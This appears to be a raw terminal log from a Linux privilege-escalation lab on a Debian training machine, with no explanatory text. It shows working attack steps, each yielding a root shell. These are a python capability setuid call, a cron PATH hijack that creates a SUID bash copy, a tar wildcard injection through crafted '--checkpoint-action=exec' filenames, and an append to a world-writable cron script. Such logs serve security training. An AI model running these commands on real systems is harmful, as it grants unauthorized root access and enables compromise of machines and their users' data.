basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1711) already running
.
set +x
root@debian:/root# strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
root@debian:/root# 

TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

root@debian:~# 

root@debian:~# echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
root@debian:~# chmod +x /home/user/overwrite.sh

TCM@debian:~$ cd /home/user/.config

TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 

TCM@debian:~/.config$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

root@debian:~# cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
root@debian:~# 

root@debian:~# echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
root@debian:~# touch /home/user/--checkpoint=1
root@debian:~# touch /home/user/--checkpoint-action=exec=sh\ runme.sh

TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

TCM@debian:~/.config$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~/.config$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
TCM@debian:~/.config$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
TCM@debian:~/.config$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
TCM@debian:~/.config$ 

TCM@debian:~$ /tmp/x

TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ 





